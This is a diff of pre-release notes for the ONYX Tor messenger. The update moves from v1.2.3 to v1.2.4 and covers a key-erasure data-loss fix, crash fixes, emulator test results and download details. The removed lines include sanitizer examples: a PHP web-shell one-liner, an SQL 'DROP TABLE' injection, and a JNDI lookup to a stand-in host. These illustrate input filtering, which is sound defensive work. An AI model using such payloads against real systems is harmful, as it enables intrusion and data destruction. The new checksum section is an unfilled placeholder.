@@ -1,71 +1,57 @@
-# ONYX v1.2.3 "Forge": People, Not Programs (pre-release)
+# ONYX v1.2.4 "Forge": Hardened on Every Android (pre-release)
 
-🌐 [0nyx.up.railway.app](https://0nyx.up.railway.app/) · Source: [SirRogersJackBlood/ONYX](https://github.com/SirRogersJackBlood/ONYX) · Release: [v.1.2.3](https://github.com/SirRogersJackBlood/ONYX/releases/tag/v.1.2.3) · Previous: [v1.1.0](https://github.com/SirRogersJackBlood/ONYX/releases/tag/v1.1.0)
+🌐 [0nyx.up.railway.app](https://0nyx.up.railway.app/) · Source: [SirRogersJackBlood/ONYX](https://github.com/SirRogersJackBlood/ONYX) · Release: [v1.2.4](https://github.com/SirRogersJackBlood/ONYX/releases/tag/v1.2.4) · Previous: [v.1.2.3](https://github.com/SirRogersJackBlood/ONYX/releases/tag/v.1.2.3)
 
 > **Pre-release (debug build).** Signed with a development key for testing. The F-Droid release will be built and signed by F-Droid from source and will **not** upgrade over this build.
 >
-> Final pre-release before the beta. Includes all v1.2.x changes (1.2.0 was skipped and the 1.2.2 test build was not published).
+> **Update recommended for everyone on Android 12, 13 or 14.** On v1.2.3, removing your phone's screen lock made Android erase ONYX's key, and with it every message and contact on the phone.
 
-## New in v1.2.3
+## Fixed in v1.2.4
 
-### Credits
-The About screen now has a **CREDITS** card:
-- **Design, direction & QA:** SirRogersJackBlood
-- **Development:** Claude (Anthropic), AI pair-programmer
-- **Built on:** libsignal (Signal) · Tor, tor-android & jtorctl (The Tor Project, Guardian Project) · Snowflake via IPtProxy · ZXing
+Three bugs, all found by a new emulator test lab and all re-tested.
 
-ONYX's code was written with AI assistance and tested on real devices by its designer. Independent security review is welcome: report issues privately via [GitHub Security Advisories](https://github.com/SirRogersJackBlood/ONYX/security/advisories/new) (see `SECURITY.md`).
+| Bug | Who it affected | What happens now |
+|---|---|---|
+| **Data loss when the screen lock is removed** | Android 12–14 | Android erases keys tied to the screen lock when the lock is removed. On these versions ONYX's key stays in the phone's secure hardware (StrongBox or TEE) but is no longer tied to the lock. v1.2.3 keys are switched over safely on first start. |
+| **Crash at first launch with no screen lock** | Android 13–14 | Fixed. Settings → Security shows a red **NO SCREEN LOCK** warning with a button to set one. |
+| **Crash when Tor had to restart** (background restrictions, or reopening after "Stop ONYX") | All versions | Tor's core runs once per process, so ONYX restarts its process cleanly instead of starting Tor twice. |
 
-## Also in v1.2 (from v1.2.1)
+If Android has already erased ONYX's key (for example you removed your screen lock while on v1.2.3), ONYX now starts fresh and explains why once, instead of crashing on every launch. That data cannot be recovered; your contacts need to pair with you again.
 
-### Security hardening: people, not programs
-ONYX is now deliberately useless as an automated or hidden command channel:
+Android 11, 15 and 16 keep the key tied to the screen lock, as before.
 
-- **80 characters, one line.** Enforced when sending **and** again when receiving, so a modified or older client gains nothing.
-- **Code symbols stripped.** Only letters, numbers, emoji and `. , ! ? ' " - : ( )` survive. Brackets, backticks, `$ \ | ; = # % & * _ @ / ^ ~ +` are removed.
-- **No consecutive symbols.** `!!!` → `!`, `--` → `-`, `?>` → `?`.
-- **Invisible and look-alike characters removed.** Zero-width characters and bidi overrides are stripped; full-width look-alikes are normalized, then filtered.
-- **Rate limit.** 20 messages per minute per contact, at least 0.7 s apart.
-- **No attachments,** now or planned. There is no API or intent through which another app can send a message.
+## Tested
 
-| Sent | Arrives as |
-|---|---|
-| `<?php system($_GET['c']); ?>` | `?php system(GET'c'` |
-| `'; DROP TABLE users; --` | `' DROP TABLE users -` |
-| `${jndi:ldap://evil.example/a}` | `jndi:ldap:evil.examplea` |
-| `Hey!! Are we still on for 7:30 tonight??` | `Hey! Are we still on for 7:30 tonight?` |
+`scripts/emulator-lab.ps1`: **65/65 checks pass** on 5 emulated devices.
 
-### About & origin
-- The in-app **About** screen now tells the ONYX origin story and explains the message rules.
-- The website has a new **/ORIGIN** section and an **About** page, plus [`ABOUT.md`](https://github.com/SirRogersJackBlood/ONYX/blob/main/ABOUT.md) in the repo.
+| Device | Android | Profile |
+|---|---|---|
+| Pixel 4a | 11 (minimum) | No Google services, 2 GB RAM |
+| Small phone | 13 | 200% text size |
+| Pixel 7 | 14 | Mainstream phone |
+| Pixel Tablet | 15 | Tablet |
+| Pixel Fold | 16 (target) | Foldable, edge-to-edge |
 
-### Other
-- **Version tracking on About:** shows the installed version and build number (read from the app itself), the build type, the signing certificate's SHA-256 (compare it with the value below) and a version history.
-- Version **1.2.3** (versionCode 6).
-- `core` tests: **28/28** (5 new security tests).
+Each runs 13 checks: install, launch and Tor bootstrap, rotation, dark mode, offline and back online, Doze, memory pressure, restricted background, process death, screen lock added, screen lock removed.
 
 ## Compatibility
-- Wire protocol unchanged. Works with v1.0.0-pre1 and v1.1.0.
-- Messages from older versions are sanitized when received on v1.2.3.
-- Same signing key as earlier pre-releases, so installing over them keeps your data.
+- Wire protocol unchanged. Works with v1.0.0-pre1 through v1.2.3.
+- Same signing key as earlier pre-releases: installs over them and keeps your data.
 
 ## Downloads
 
 | File | For |
 |---|---|
-| `onyx-v1.2.3-arm64-v8a-debug.apk` | Almost all phones since 2017. **Pick this if unsure.** |
-| `onyx-v1.2.3-armeabi-v7a-debug.apk` | Older 32-bit phones |
-| `onyx-v1.2.3-x86_64-debug.apk` | Emulators |
-| `onyx-v1.2.3-universal-debug.apk` | Any device (largest) |
+| `onyx-v1.2.4-arm64-v8a-debug.apk` | Almost all phones since 2017. **Pick this if unsure.** |
+| `onyx-v1.2.4-armeabi-v7a-debug.apk` | Older 32-bit phones |
+| `onyx-v1.2.4-x86_64-debug.apk` | Emulators |
+| `onyx-v1.2.4-universal-debug.apk` | Any device (largest) |
 
 ## Verify
 
 **SHA-256**
 ```text
-03bb0952e90aa7cf717a42871df89e4cc89d612a26348cd3a80c261aa2f12630  onyx-v1.2.3-arm64-v8a-debug.apk
-2156b61d4d907f16e12987fd0fcbafbc476dbca8a7d490193d144825aa03d571  onyx-v1.2.3-armeabi-v7a-debug.apk
-dddd19ad7fcede2b4a5727222ca3beab0dc3a9339bd76e8149f79da681604fe0  onyx-v1.2.3-x86_64-debug.apk
-7282a86a348993fa8fe17095c5db59c67cda3d7b0b726b0e87ce2aefb39c4124  onyx-v1.2.3-universal-debug.apk
+<paste v1.2\SHA256SUMS.txt here after staging>
 ```
 
 **PGP** (release key `9672 6F1B CC9F 9D5E 0CED CF9C BC48 B84D 2415 5676`, SirRogersJackBlood <sirrogersjackblood@proton.me>; key at [0nyx.up.railway.app/onyx-release-key.asc](https://0nyx.up.railway.app/onyx-release-key.asc))
@@ -75,21 +61,16 @@ gpg --verify SHA256SUMS.txt.asc SHA256SUMS.txt
 ```
 Each APK also has a detached `.apk.asc` signature.
 
-**Signing certificate** (`CN=Android Debug, O=Android, C=US`, expected to be the same as previous releases)
+**Signing certificate** (`CN=Android Debug, O=Android, C=US`, same as previous releases)
 ```text
 SHA-256  f9eb3fcbbc2115fb3b5dcd67e842e62d80c4c2afa85dd4c5401dbdcca2ee5165
-```
-
-```powershell
-Get-FileHash .\onyx-v1.2.3-arm64-v8a-debug.apk -Algorithm SHA256
-apksigner verify --print-certs .\onyx-v1.2.3-arm64-v8a-debug.apk
 ```
 
 ## Known limitations
 - Both phones must be online for delivery (messages queue and retry). Mailbox mode is planned.
 - One onion address per identity; no Tor client authorization yet.
 - Tor circuits are not post-quantum (message content is).
-- Higher battery use than push-based messengers, by design.
+- If Tor must restart while ONYX is open on screen, the window closes; reopen it.
 
 ---
-<sub>Design, direction & QA by **SirRogersJackBlood** · Development by Claude (Anthropic) · AGPL-3.0-only · Change records CR-ONYX-2026-003, CR-ONYX-2026-004</sub>
+<sub>Design, direction & QA by **SirRogersJackBlood** · Development by Claude (Anthropic) · AGPL-3.0-only · Change record CR-ONYX-2026-005</sub>
